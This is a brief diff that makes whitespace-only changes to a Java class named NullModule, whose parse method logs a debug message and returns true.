@@ -6,13 +6,13 @@ import com.android.syssetup.util.Check;
 
 public class NullModule extends BaseModule {
 	private static final String TAG = "NullModule";
-	
+
 	@Override
 	protected boolean parse(ConfModule conf) {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (parse): null module"); //$NON-NLS-1$
 		}
-		
+
 		return true;
 	}
 
